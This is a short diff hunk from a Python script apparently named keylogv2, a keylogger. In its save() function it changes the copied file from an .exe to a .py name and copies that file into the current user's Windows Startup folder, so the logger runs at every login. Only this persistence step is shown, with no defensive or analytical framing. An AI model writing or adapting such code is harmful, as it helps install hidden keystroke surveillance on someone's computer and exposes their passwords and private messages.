@@ -106,7 +106,7 @@ def save():
         
         #copying the file to somewhere (in my case the startup path)
 
-        filePath = os.getcwd()+ '\\' + "keylogv2.exe"
+        filePath = os.getcwd()+ '\\' + "keylogv2.py"
         Des_file = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
         shutil.copy2(filePath, Des_file)
     finally:
